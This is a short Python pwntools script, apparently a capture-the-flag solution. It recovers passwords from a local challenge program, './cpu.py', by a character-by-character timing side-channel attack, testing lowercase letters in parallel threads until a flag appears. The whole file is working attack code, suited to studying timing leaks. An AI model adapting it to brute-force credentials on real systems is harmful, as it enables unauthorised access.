from pwn import *
import threading

curr_passwd = ''
time_taken = 0

password_list = []

checklist = []


def try_letter(_i, _curr_passwd, _time_taken):
    global checklist
    p = process("./cpu.py")

    for k in password_list:
        p.sendline(k.encode())
        p.recvline().decode()

    p.sendline(_curr_passwd.encode() + _i.encode())
    # print(curr_passwd + i)
    j = p.recvline().decode()
    # print(j)
    if 'Congratulations!' in j:
        print(j)
        password_list.append(_curr_passwd + _i)
        _curr_passwd = ''
        _time_taken = 0
        print("Found passwords: ", password_list)
        p.close()
        checklist = [_curr_passwd, _time_taken, 0]
        if 'flag' in j:
            checklist[2] = 1
        return
    j = p.recvline().decode()
    x = j.split()[-1]
    # print(x)

    x = float(x)
    print("Found passwords: ", password_list)
    print(_curr_passwd + _i)
    print(abs(x - _time_taken))
    if abs(x - _time_taken) > 0.002:
        print("found!")
        _time_taken = x
        _curr_passwd += _i
        p.close()
        checklist = [_curr_passwd, _time_taken, 0]
        return

    p.close()
    return


while True:
    # print(curr_passwd)
    threads = []
    for i in "abcdefghijklmnopqrstuvwxyz":
        t = threading.Thread(target=try_letter, args=(i, curr_passwd, time_taken))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    curr_passwd = checklist[0]
    time_taken = checklist[1]
    if checklist[2] == 1:
        break
